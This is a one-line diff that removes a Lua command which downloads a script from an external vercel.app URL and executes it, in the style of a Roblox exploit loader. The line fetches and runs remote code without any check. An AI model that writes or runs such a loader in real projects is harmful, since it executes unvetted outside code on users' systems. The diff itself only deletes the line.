@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://ophelia.vercel.app/Loader.lua"))()
